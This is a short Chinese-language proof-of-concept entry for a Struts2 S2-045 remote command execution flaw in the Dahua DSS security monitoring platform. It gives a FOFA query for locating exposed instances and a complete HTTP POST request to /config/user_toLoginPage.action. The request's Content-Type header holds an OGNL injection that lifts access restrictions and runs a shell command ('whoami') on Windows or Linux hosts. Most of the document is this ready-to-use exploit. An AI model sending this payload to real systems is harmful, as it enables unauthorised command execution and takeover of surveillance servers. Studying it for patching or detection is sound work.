## 大华DSS城市安防监控平台user_toLoginPage.action接口存在Struct2-045命令执行漏洞

大华DSS安防监控系统平台采用Apache Struts2作为网站应用框架。/config/user_toLoginPage.action接口存在远程命令执行漏洞，攻击者可以通过在上传文件时修改HTTP请求标头中的Content Type值来触发该漏洞，然后执行该漏洞。系统命令以获取服务器权限。

## fofa

```
app="dahua-DSS"
```

## poc

```
POST /config/user_toLoginPage.action HTTP/1.1
Host: 
Connection: close
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/1.8.0_333
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 0
```

![image-20240604085832753](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406040858859.png)